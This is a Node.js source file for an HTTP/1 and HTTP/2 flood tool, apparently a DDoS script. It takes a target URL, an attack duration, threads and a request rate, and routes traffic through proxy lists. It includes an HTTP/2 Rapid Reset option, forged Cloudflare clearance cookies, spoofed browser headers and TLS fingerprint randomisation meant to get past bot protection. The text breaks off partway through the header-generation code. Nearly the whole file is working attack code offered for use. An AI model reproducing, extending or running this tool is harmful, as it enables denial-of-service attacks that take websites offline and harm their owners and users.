const net = require('net');
const tls = require('tls');
const HPACK = require('hpack');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const colors = require('colors');
const { Command } = require('commander');
const socks = require('socks').SocksClient;

process.setMaxListeners(0);

process.on('uncaughtException', function (e) {
});
process.on('unhandledRejection', function (e) {
});

const options = new Command();
options
    .option('-m, --method <method>', 'Request method <GET/POST/...>')
    .option('-u, --target <url>', 'Target URL <http/https>')
    .option('-s, --time <seconds>', 'Duration of attack <seconds>', 120)
    .option('-t, --threads <number>', 'Number of threads <int>', 5)
    .option('-r, --rate <rate>', 'Requests per second <int>', 00)
    .option('-p, --proxy <proxy>', 'Proxy file <path>')
    .option('-T, --type <proxytype>', 'Proxy type <http/socks4/socks5>', 'http')
    .option('-d, --debug <true/false>', 'Debug mode', true)
    .option('-v, --http <1/2>', 'HTTP version', 2)
    .option('--full <true/false>', 'Full HTTP headers', false)
    .option('--extra <true/false>', 'Extra HTTP headers', false)
    .option('--delay <10/1000>', 'Delay between requests', 10)
    .option('-D, --data <string/RAND>', 'Request data')
    .option('--cache <true/false>', 'Disable cache header', false)
    .option('--close <true/false>', 'Close broken proxies', false)
    .option('--conns <1/1000>', 'Connection limit')
    .option('--reset <true/false>', 'Rapidreset exploit', false)
    .option('-q, --query <true/false>', 'Generate random query', false)
    .option('--randrate <1-128/60>', 'Random request rate', "")
    .option('--randpath <true/false>', 'Random URL path', false)
    .option('--ratelimit <true/false>', 'Ratelimit mode', false)
    .option('--slowmo <true/false>', 'Slow request rate', false)
    .option('-I, --ip <IPv4>', 'IPv4 address')
    .option('-U, --ua <string>', 'User-agent header')
    .option('-C, --cookie <string/RAND>', 'Cookie header (string/CLOUDFLARE/RANDOM)')
    .option('-F, --fingerprint <true/false>', 'TLS fingerprint', false)
    .option('-R, --referer <url/RAND>', 'Referer URL header')
    .option('--test <true/false>', 'Debug data frame', false)
    .option('--checker <true/false>', 'Proxy checker', false)
    .option('--proxyapi <url>', 'Fetch proxies from proxy API')
    .option('--config <file>', 'Load configuration <file.json>')
    .parse(process.argv);

if (options.opts().config && typeof options.opts().config === 'string') {
    try {
        const config_options = fs.readFileSync(options.config, 'utf8');
        const config = JSON.parse(config_options);
        Object.keys(config).forEach(key => {
            if (options[key] !== null && config[key] !== null && config[key] !== false && config[key] !== options.opts()[config[key]]) {
                options[key] = config[key];
            }
        });
    } catch (error) {
        console.error(`Error loading config: ${error.message}`);
        process.exit(0)
    }
}

const opts = options.opts();

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;

if (!options.opts().method || !options.opts().target || !options.opts().proxy && !options.opts().ip) {
    options.help();
    process.exit(1);
}

var reqmethod = opts.method || "GET";
const target = opts.target;
const time = opts.time || 120;
const threads = opts.threads;
const ratelimit = opts.rate || 60;
const proxyfile = opts.proxy;
const proxytype = opts.type;
const debug = opts.debug || false;

const http_opt = parseInt(opts.http) || 2;
const full_headers = opts.full || false;
const extra_headers = opts.extra || false;
const delay_opt = opts.delay || 10;
const data_opt = opts.data || undefined;
const cache_opt = opts.cache;
const close_opt = opts.close || false;
const rapidreset = opts.reset || false;

const query_opt = opts.query || false;
const randrate = opts.randrate || "";
const randpath = opts.randpath || false;
const ratelimit_opt = opts.ratelimit;

const fingerprint_opt = opts.fingerprint || true;
const referer_opt = opts.referer || false;

const ip_opt = opts.ip || undefined;
const ua_opt = opts.ua || undefined;
const checker = opts.checker || false;
const proxyapi = opts.proxyapi || undefined;
const connections = opts.conns;
const slowmo = opts.slowmo || false;
const test = opts.test || false;
var cookie_opt = opts.cookie || undefined;
var cookie_mode = "";

const status_queue = []
let status_codes = {}

const url = new URL(target);
const protocol = url.protocol.replace(":", "");
const port = url.port || (url.protocol === 'https:' ? 443 : 80);

const request_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'RAND']

const SettingHeaderTableSize = 0x1;
const SettingEnablePush = 0x2;
const SettingInitialWindowSize = 0x4;
const SettingMaxHeaderListSize = 0x6;

if (!proxyfile && !ip_opt) {
    console.error("Proxy file is missing!");
    process.exit(1);
}

let proxies;

if (proxyfile) {
    proxies = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
}

if (proxyapi) {
    try {
        const proxyurl = new URL(proxyapi);
        const proxy_proto = proxyurl.protocol.replace(':', '');
        https.request({
            hostname: proxyurl.hostname,
            port: proxy_proto === 'https' ? 443 : 80,
            method: 'GET',
            path: proxyurl.pathname + proxyurl.search
        }, (res) => {
            if (res.statusCode !== 200) {
                console.log(`[${colors.bold.magenta('JS/PENGUIN')}] | ${colors.bold('Proxy API')}: [${colors.underline(proxyurl.hostname)}], ${colors.bold('Error')}: [${colors.underline('Invalid response: Status Code' + res.statusCode)}]`);
                process.exit(0);
            }
            let body = '';
            res.on('data', (data) => body += data);
            res.on('end', () => {
                proxies = body.replace(/\r/g, '').split('\n').filter(proxy => proxy.trim() !== '');
            })
        }).on('error', (e) => {
        }).end();
    } catch (err) {
    }
}

if (!request_methods.includes(reqmethod)) {
    console.error('Invalid request method!');
    process.exit(1);
}

if (!['http', 'https', 'socks4', 'socks5'].includes(proxytype)) {
    console.error('Invalid proxytype! (http/https/socks4/socks5)');
    process.exit(1);
}

function random_string(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyz';
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function random_char(length) {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

function random_int(minimum, maximum) {
    return Math.floor(Math.random() * (maximum - minimum + 1)) + minimum;
}

function random_cookies() {
    let cookies = "";
    const cookie_names = ["JSESSIONID", "_ga", "PHPSESSID", `_ga_${random_string(random_int(10, 11)).toUpperCase()}`];
        
    const cookie_limit = random_int(1, cookie_names.length);
    for (var x = 0; x < cookie_limit; x++) {
        const cookie_name = cookie_names[Math.floor(Math.random() * cookie_names.length)];
        const cookie_index = cookie_names.indexOf(cookie_name);
        if (cookie_index > -1) {
            cookie_names.splice(cookie_index, 1);
        }
        const cookie_value = random_string(random_int(random_int(16, 32), random_int(32, 64)));
        cookies += `${cookie_name}=${cookie_value}`;
        if (x+1 < cookie_limit) {
            cookies += '; ';
        }
    }
    return cookies
}

const format_date = () => {
    const now = new Date();
    const days = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"];
    const months = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];

    const day_name = days[now.getUTCDay()];
    const day = String(now.getUTCDate()).padStart(2, '0');
    const month = months[now.getUTCMonth()];
    const year = String(now.getUTCFullYear()).slice(-2);
    const time = now.toISOString().split("T")[1].split(".")[0];

    return `${day_name}, ${day}-${month}-${year} ${time} GMT`;
};

const priorities = ["MEDIUM", "HIGH"];

function cloudflare_cookies(pathname) {
    const timestamp = Math.floor(Date.now() / 1000)
    const cookies = [];
    const extra_parts = [
        `Path=${pathname}`,
        `Expires=${format_date()}`,
        `Domain=.${url.hostname}`,
        `Priority=${priorities[~~Math.floor(Math.random() * priorities.length)]}`,
        `HttpOnly`,
        `Secure`,
        `SameSite=None`,
        'Partitioned'
    ];

    const extra = Math.random() < 0.50 ? extra_parts.splice(0, random_int(extra_parts.length - 2, extra_parts.length - 1)).join('; ') : extra_parts.join('; ');
    if (Math.random() < 0.75) {
        const CF_BFM = `__cf_bm=${random_char(43)}-${timestamp}-0-${random_char(28)}/${random_char(37)}+${random_char(38)}+${random_char(50)}+${random_char(37)}${'='*random_int(1, 2)}`;
        cookies.push(CF_BFM);
    }

    const CF_CLR = `cf_clearance=${random_char(15)}_${random_char(43)}-${timestamp}-1.2.1.1-${random_char(35)}.${random_char(205)}.${random_char(51)}.${random_char(30)}.${random_char(17)}`;
    cookies.push(CF_CLR);
    cookies.push(extra);

    return cookies.join('; ').slice(cookies.length-1, cookies.length);
}

function random_ip() {
    return `${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}.${random_int(1, 255)}`;
}

const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
]

const curves = [
    "X25519",
    "P-256",
    "P-384"
]

const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
]

const versions = [
    "TLSv1.3",
    "TLSv1.2",
    "TLSv1.1",
]

const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.9",
];

const encodings = [
    "gzip, deflate, br, zstd",
    "gzip, deflate, br"
]

const profiles = [
    {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Google Chrome";v="133"', "sec-ch-ua-platform": '"Windows"'},
    {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Microsoft Edge";v="133"', "sec-ch-ua-platform": '"Windows"'},
    {"user-agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Google Chrome";v="133"', "sec-ch-ua-platform": '"macOS"'},
    {"user-agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Microsoft Edge";v="133"', "sec-ch-ua-platform": '"macOS"'},
    {"user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Google Chrome";v="133"', "sec-ch-ua-platform": '"Linux"'},
    {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Google Chrome";v="133"', "sec-ch-ua-platform": '"Windows"'},
    {"user-agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:135.0) Gecko/20100101 Firefox/135.0', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Google Chrome";v="133"', "sec-ch-ua-platform": '"macOS"'},
    {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="132", "Google Chrome";v="132"', "sec-ch-ua-platform": '"Windows"'},
    {"user-agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="132", "Google Chrome";v="132"', "sec-ch-ua-platform": '"macOS"'},
    {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36 Edg/132.0.0.0', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="132", "Microsoft Edge";v="132"', "sec-ch-ua-platform": '"Windows"'},
    {"user-agent": 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="131", "Google Chrome";v="131"', "sec-ch-ua-platform": '"Linux"'},
    {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="131", "Google Chrome";v="131"', "sec-ch-ua-platform": '"Windows"'},
    {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="131", "Microsoft Edge";v="131"', "sec-ch-ua-platform": '"Windows"'},
    {"user-agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="131", "Google Chrome";v="131"', "sec-ch-ua-platform": '"macOS"'},
    {"user-agent": 'Mozilla/5.0 (X11; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Google Chrome";v="133"', "sec-ch-ua-platform": '"Linux"'},
    {"user-agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Google Chrome";v="133"', "sec-ch-ua-platform": '"Windows"'},
    {"user-agent": 'Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:134.0) Gecko/20100101 Firefox/134.0', "sec-ch-ua": '"Not.A/Brand";v="24", "Chromium";v="133", "Google Chrome";v="133"', "sec-ch-ua-platform": '"macOS"'}
];

const ssl_versions = ['771', '772', '773', '770', '769'];
const cipher_suites = [
    '4865', '4866', '4867', '49195', '49199', '49196', '49200',
    '52393', '52392', '49171', '49172', '156', '157', '47', '53',
    '4868', '49157', '49158', '49159', '49160', '49161', '49162',
    '49163', '49164', '49165', '49166', '49167', '49168', '49169',
    '49170', '49173', '49174', '49175', '49176', '49177', '49178',
    '49179', '49180', '49181', '49182', '49183', '49184', '49185',
    '49186', '49187', '49188', '49189', '49190', '49191', '49192',
    '49193', '49194', '49195', '49196', '49197', '49198', '49199',
    '49200', '49201', '49202', '49203', '49204', '49205', '49206',
    '49207', '49208', '49209', '49210', '49211', '49212', '49213',
    '49214', '49215', '49216', '49217', '49218', '49219', '49220',
    '49221', '49222', '49223', '49224', '49225', '49226', '49227',
    '49228', '49229', '49230', '49231', '49232', '49233', '49234',
    '49235', '49236', '49237', '49238', '49239', '49240', '49241',
    '49242', '49243', '49244', '49245', '49246', '49247', '49248',
    '49249', '49250', '49251', '49252', '49253', '49254', '49255',
    '49256', '49257', '49258', '49259', '49260', '49261', '49262',
    '49263', '49264', '49265', '49266', '49267', '49268', '49269',
    '49270', '49271', '49272', '49273', '49274', '49275', '49276',
    '49277', '49278', '49279', '49280', '49281', '49282', '49283',
    '49284', '49285', '49286', '49287', '49288', '49289', '49290',
    '49291', '49292', '49293', '49294', '49295', '49296', '49297',
    '49298', '49299', '49300', '49301', '49302', '49303', '49304',
    '49305', '49306', '49307', '49308', '49309', '49310', '49311',
    '49312', '49313', '49314', '49315', '49316', '49317', '49318',
    '49319', '49320', '49321', '49322', '49323', '49324', '49325'
];
const extensions = [
    '45', '35', '18', '0', '5', '17513', '27', '10', '11', '43',
    '13', '16', '65281', '65037', '51', '23', '41', '21', '22',
    '24', '25', '26', '28', '29', '30', '31', '32', '33', '34',
    '36', '37', '38', '39', '40', '42', '44', '46', '47', '48',
    '49', '50', '52', '53', '54', '55', '56', '57', '58', '59',
    '60', '61', '62', '63', '64', '65', '66', '67', '68', '69',
    '70', '71', '72', '73', '74', '75', '76', '77', '78', '79',
    '80', '81', '82', '83', '84', '85', '86', '87', '88', '89',
    '90', '91', '92', '93', '94', '95', '96', '97', '98', '99',
    '100', '101', '102', '103', '104', '105', '106', '107', '108',
    '109', '110', '111', '112', '113', '114', '115', '116', '117',
    '118', '119', '120', '121', '122', '123', '124', '125', '126',
    '127', '128', '129', '130', '131', '132', '133', '134', '135',
    '136', '137', '138', '139', '140', '141', '142', '143', '144',
    '145', '146', '147', '148', '149', '150', '151', '152', '153',
    '154', '155', '156', '157', '158', '159', '160', '161', '162',
    '163', '164', '165', '166', '167', '168', '169', '170', '171',
    '172', '173', '174', '175', '176', '177', '178', '179', '180',
    '181', '182', '183', '184', '185', '186', '187', '188', '189',
    '190', '191', '192', '193', '194', '195', '196', '197', '198',
    '199', '200', '201', '202', '203', '204', '205', '206', '207',
    '208', '209', '210', '211', '212', '213', '214', '215', '216',
    '217', '218', '219', '220', '221', '222', '223', '224', '225',
    '226', '227', '228', '229', '230', '231', '232', '233', '234',
    '235', '236', '237', '238', '239', '240', '241', '242', '243',
    '244', '245', '246', '247', '248', '249', '250', '251', '252',
    '253', '254', '255'
];
const elliptic_curves = ['4588', '29', '23', '24', '25', '26', '27', '28', '30', '31', '32', '33', '34', '35', '36', '37', '38', '39', '40', '41', '42', '43', '44', '45', '46', '47', '48', '49', '50'];

function createProxyObject(host, port, type, username = null, password = null) {
    return {
        host: host,
        port: parseInt(port),
        type: type,
        username: username,
        password: password,
        socket: null,
        retries: 0,
        maxRetries: 3,
        isDead: false
    };
}

function proxyConnect(proxyObj, options = {}) {
    return new Promise((resolve, reject) => {
        if (proxyObj.isDead) {
            return reject(new Error('Proxy is dead'));
        }

        if (proxyObj.type === 'SOCKS4' || proxyObj.type === 'SOCKS5') {
            proxySocks(proxyObj, options)
                .then(resolve)
                .catch((err) => {
                    proxyHandleError(proxyObj, err, reject);
                });
        } else if (proxyObj.type === 'HTTP' || proxyObj.type === 'HTTPS') {
            proxyHttp(proxyObj, options)
                .then(resolve)
                .catch((err) => {
                    proxyHandleError(proxyObj, err, reject);
                });
        } else {
            reject(new Error('Invalid proxy type'));
        }
    });
}

function proxyHandleError(proxyObj, err, reject) {
    proxyObj.retries++;
    if (proxyObj.retries >= proxyObj.maxRetries) {
        proxyObj.isDead = true;
        if (checker) {
            const proxyKey = proxyObj.username && proxyObj.password ? 
                `${proxyObj.host}:${proxyObj.port}:${proxyObj.username}:${proxyObj.password}` : 
                `${proxyObj.host}:${proxyObj.port}`;
            const idx = proxies.indexOf(proxyKey);
            if (idx > -1) proxies.splice(idx, 1);
        }
        reject(new Error(`Proxy ${proxyObj.host}:${proxyObj.port} is dead: ${err.message}`));
    } else {
        reject(new Error(`Proxy ${proxyObj.host}:${proxyObj.port} retry ${proxyObj.retries}/${proxyObj.maxRetries}: ${err.message}`));
    }
}

function proxySocks(proxyObj, options) {
    return new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
            reject(new Error('SOCKS connection timeout'));
        }, options.timeout || 10000);

        const proxyConfig = {
            host: proxyObj.host,
            port: proxyObj.port,
            type: proxyObj.type === 'SOCKS5' ? 5 : 4
        };

        if (proxyObj.username && proxyObj.password) {
            proxyConfig.userId = proxyObj.username;
            proxyConfig.password = proxyObj.password;
        } else if (options.username && options.password) {
            proxyConfig.userId = options.username;
            proxyConfig.password = options.password;
        }

        socks.createConnection({
            proxy: proxyConfig,
            command: 'connect',
            destination: { host: url.hostname, port: port },
            timeout: options.timeout || 10000,
        }, (error, info) => {
            clearTimeout(timeout);
            if (error) {
                return reject(new Error(`SOCKS connection error: ${error.message}`));
            }
            proxyObj.socket = info.socket;
            proxyObj.retries = 0;
            resolve(info.socket);
        });
    });
}

function proxyHttp(proxyObj, options) {
    return new Promise((resolve, reject) => {
        const timeout = setTimeout(() => {
            socket.destroy();
            reject(new Error('HTTP proxy connection timeout'));
        }, options.timeout || 10000);

        const socket = net.connect({host: proxyObj.host, port: proxyObj.port}, () => {
            clearTimeout(timeout);
            let request_header;
            
            const username = proxyObj.username || options.username;
            const password = proxyObj.password || options.password;
            
            if (username && password) {
                const authString = Buffer.from(`${username}:${password}`).toString('base64');
                request_header = `CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nProxy-Authorization: Basic ${authString}\r\nConnection: Keep-Alive\r\n\r\n`;
            } else {
                request_header = `CONNECT ${url.hostname}:${port} HTTP/1.1\r\nHost: ${url.hostname}:${port}\r\nConnection: Keep-Alive\r\n\r\n`;
            }
            socket.write(request_header);
        });

        let responseData = '';
        let resolved = false;

        socket.on('data', (data) => {
            responseData += data.toString('utf8');
            
            if (responseData.includes('HTTP/1.1 200') || 
                responseData.includes('HTTP/1.0 200') ||
                responseData.includes('HTTP/1.1 OK') || 
                responseData.includes('HTTP/1.0 OK') ||
                responseData.toLowerCase().includes('connection established')) {
                if (!resolved) {
                    resolved = true;
                    proxyObj.socket = socket;
                    proxyObj.retries = 0;
                    resolve(socket);
                }
            } else if (responseData.includes('HTTP/1.1 407') || 
                       responseData.includes('Proxy Authentication Required')) {
                socket.destroy();
                reject(new Error('Proxy authentication failed'));
            } else if (responseData.includes('HTTP/1.1 403') || 
                       responseData.includes('HTTP/1.0 403')) {
                socket.destroy();
                reject(new Error('Proxy forbidden'));
            } else if (responseData.includes('HTTP/1.1 500') || 
                       responseData.includes('HTTP/1.0 500')) {
                socket.destroy();
                reject(new Error('Proxy internal server error'));
            } else if (responseData.includes('HTTP/1.1 502') || 
                       responseData.includes('HTTP/1.0 502')) {
                socket.destroy();
                reject(new Error('Proxy bad gateway'));
            } else if (responseData.includes('HTTP/1.1 503') || 
                       responseData.includes('HTTP/1.0 503')) {
                socket.destroy();
                reject(new Error('Proxy service unavailable'));
            } else if (responseData.includes('\r\n\r\n') || 
                       responseData.includes('\n\n')) {
                if (!resolved) {
                    resolved = true;
                    const statusMatch = responseData.match(/HTTP\/1\.[01] (\d{3})/);
                    const statusCode = statusMatch ? statusMatch[1] : 'Unknown';
                    socket.destroy();
                    reject(new Error(`Bad proxy response: ${responseData.split('\n')[0] || 'Unknown response'}`));
                }
            }
        });

        socket.on('timeout', () => {
            clearTimeout(timeout);
            if (!resolved) {
                resolved = true;
                socket.destroy();
                reject(new Error('Connection timeout'));
            }
        });

        socket.on('error', (err) => {
            clearTimeout(timeout);
            if (!resolved) {
                resolved = true;
                socket.destroy();
                reject(new Error(`Connection error: ${err.message}`));
            }
        });

        socket.on('close', () => {
            clearTimeout(timeout);
            if (!resolved) {
                resolved = true;
                reject(new Error('Connection closed'));
            }
        });

        socket.setTimeout(options.timeout || 10000);
        socket.setKeepAlive(true, 60000);
        socket.setMaxListeners(10 * 10 * 60);
    });
}

function proxyClose(proxyObj) {
    if (proxyObj.socket) {
        try {
            proxyObj.socket.destroy();
            proxyObj.socket.removeAllListeners();
        } catch (e) {}
        proxyObj.socket = null;
    }
}

function proxyIsAlive(proxyObj) {
    return !proxyObj.isDead && proxyObj.socket && !proxyObj.socket.destroyed;
}

function parseProxyLine(proxyLine) {
    let proxy_proto = 'HTTP';
    let proxy_host, proxy_port, proxy_user, proxy_pass;
    
    if (proxyLine.includes('://')) {
        const parts = proxyLine.split('://');
        proxy_proto = parts[0].toUpperCase();
        proxyLine = parts[1];
    }
    
    const proxy = proxyLine.split(':');
    
    if (proxy.length >= 2) {
        proxy_host = proxy[0];
        proxy_port = parseInt(proxy[1]);
        
        if (proxy.length == 4) {
            proxy_user = proxy[2];
            proxy_pass = proxy[3];
        }
    }
    
    return { proxy_proto, proxy_host, proxy_port, proxy_user, proxy_pass };
}

function createHttp2Object(proxy) {
    return {
        id: 1,
        data: Buffer.alloc(0),
        hpack: new HPACK(),
        frames: [],
        proxy: proxy
    };
}

function http2EncodeFrame(http2Obj, streamId, type, payload = "", flags = 0) {
    http2Obj.id = streamId;
    let frame = Buffer.alloc(9)
    frame.writeUInt32BE(payload.length << 8 | type, 0)
    frame.writeUInt8(flags, 4)
    frame.writeUInt32BE(streamId, 5)
    if (payload.length > 0)
        frame = Buffer.concat([frame, payload])
    return frame
}

function http2DecodeFrame(data) {
    const length_type = data.readUInt32BE(0)
    const length = length_type >> 8
    const type = length_type & 0xFF
    const flags = data.readUint8(4)
    const streamID = data.readUInt32BE(5)
    const offset = flags & 0x20 ? 5 : 0

    let payload = Buffer.alloc(0)

    if (length > 0) {
        payload = data.subarray(9 + offset, 9 + offset + length)

        if (payload.length + offset != length) {
            return null
        }
    }

    return {
        streamID,
        length,
        type,
        flags,
        payload
    }
}

function http2EncodeSettings(settings) {
    const data = Buffer.alloc(6 * settings.length)
    for (let i = 0; i < settings.length; i++) {
        data.writeUInt16BE(settings[i][0], i * 6)
        data.writeUInt32BE(settings[i][1], i * 6 + 2)
    }
    return data
}

function http2EncodeRstStream(streamId, type, flags) {
    const frame_header = Buffer.alloc(9);
    frame_header.writeUInt32BE(4, 0);
    frame_header.writeUInt8(type, 4);
    frame_header.writeUInt8(flags, 5);
    frame_header.writeUInt32BE(streamId, 5);
    const status_code = Buffer.alloc(4).fill(0);
    return Buffer.concat([frame_header, status_code]);
}

function createRequestObject(path) {
    return {
        path: path,
        headers: [],
        mode: cookie_mode,
        timestamp: Date.now().toString().substring(0, 10)
    };
}

function requestSetPath(reqObj, path) {
    reqObj.path = path
}

function requestAddHeader(reqObj, header, value) {
    const index = reqObj.headers.findIndex(([key]) => key === header);
    if (index !== -1) {
        reqObj.headers[index][1] = value;
    } else {
        reqObj.headers.push([header, value]);
    }
    return reqObj;
}

function requestFindHeader(reqObj, name) {
    const header = reqObj.headers.find(([k, _]) => k === name);
    return header ? header[1] : null;
}

function requestReplaceHeader(reqObj, k1, v1) {
    const index = reqObj.headers.findIndex(([k, _]) => k === k1);
    if (index !== -1) {
        reqObj.headers[index][1] = v1;
    }
    return reqObj;
}

function requestAddHeaders(reqObj, headers) {
    for (const [key, value] of Object.entries(headers)) {
        if (value !== null && value !== undefined) {
            reqObj.headers.push([key, value]);
        }
    }
    return reqObj;
}

function requestGenerateHeaders(reqObj) {
    reqObj.headers = [];

    const version = random_int(120, 150);
    const browsers = ["Google Chrome", "Brave", "Microsoft Edge", "Opera", "Vivaldi", "Chromium"];

    const profile = profiles[~~Math.floor(Math.random() * profiles.length)];
    const browser = browsers[~~Math.random(Math.floor() * browsers.length)];
    var sec_ch_ua, sec_ch_ua_full_version_list, sec_ch_ua_full_version;
    switch (version) {
        case 120:
            sec_ch_ua = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6099, 6200)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 121:
            sec_ch_ua = `\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6100, 6300)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not?A_Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 122:
            sec_ch_ua = `\"Not(A:Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6200, 6350)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not(A:Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 123:
            sec_ch_ua = `\"Not.A/Brand\";v=\"8\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6300, 6450)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not.A/Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 124:
            sec_ch_ua = `\"Not_A Brand\";v=\"24\", \"Chromium\";v=\"${version}\", \"${browser}\";v=\"${version}\"`;
            sec_ch_ua_full_version = `${version}.0.${random_int(6350, 6500)}.${random_int(10, 100)}`;
            sec_ch_ua_full_version_list = `\"Not_A Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"${sec_ch_ua_full_version}\", \"${browser}\";v=\"${sec_ch_ua_full_version}\"`;
            break;
        case 125:
